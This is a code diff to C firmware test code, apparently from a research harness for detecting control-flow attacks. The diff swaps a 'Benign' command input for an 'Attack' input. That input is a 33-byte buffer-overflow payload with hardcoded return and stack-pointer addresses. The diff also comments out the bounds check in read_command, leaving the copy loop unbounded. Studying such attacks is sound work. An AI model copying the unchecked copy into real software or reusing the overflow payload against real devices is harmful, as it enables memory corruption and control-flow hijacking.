@@ -1145,10 +1145,15 @@ void application() {
 
 // int test = 0;
 int data = 0;
-// void (*fun)();
+void (*fun)();
 
 // void fun1() { test = 1; } 
 // void fun2() { test = 2; } 
+
+void reset_then_evaluate(){
+  data = 0;
+  evaluate(data);
+}
 
 void evaluate(int value){
   if ((value & 1) == 1){
@@ -1157,22 +1162,22 @@ void evaluate(int value){
       }
       data++;
   } else{
-      // fun = fun2;
       data = data + 2;
   }
-  // fun();
 }
 
-void application(){
+int init = 1;
 
-    int i;
-    for(i=0; i<32; i++){
-    };
-    // i=0; 
-    // do {
-    //   i++;
-    // } while(i<32);
-    for(i=0; i<32; i++){
+void application(){
+    if (init){
+      fun = &reset_then_evaluate;
+    } else {
+      fun = &evaluate;
+    }
+
+    fun();
+    
+    for(int i=1; i<32; i++){
       evaluate(i);
     }
 }
@@ -1457,11 +1462,11 @@ void application(){
 #define cmd_all             'a'
 
 /** Benign: calls Ultrasonic only **/
-char input[4] = {'u', 0, 16, ':'};
+// char input[4] = {'u', 0, 16, ':'};
 //
-/** Attack: overwrites return address and stack pointer to cause infinite loop in process_command function **/
+/** Attack: overwrites return address and stack pointer to cause infinite loop in process_command function **/ 
 //
-//char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b',0xb4,0x06,0x04,0x08, 0xf0, 0xff, 0x03, 0x20, 0xd5, 0x05, 0x04, 0x08, ':'};
+char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b',0xb4,0x06,0x04,0x08, 0xf0, 0xff, 0x03, 0x20, 0xcd, 0x05, 0x04, 0x08, ':'};
 //
 uint32_t data[4] = {0,0,0,0};
 uint8_t temp_data[5] = {0,0,0,0,0};
@@ -1610,9 +1615,13 @@ long run_humidity(int runs){
 
 uint32_t send_data; ///2003ffc0
 void read_command(char * msg, char * input){
- 
+    // int i=0; 
     while(*input != ':'){
-        *msg = *input;
+        // if (i<31)
+          *msg = *input;
+        // else
+          // break;
+        // i++;
         // SECURE_record_output_data(*input);
         // SECURE_record_output_data(*msg);/
         msg++;
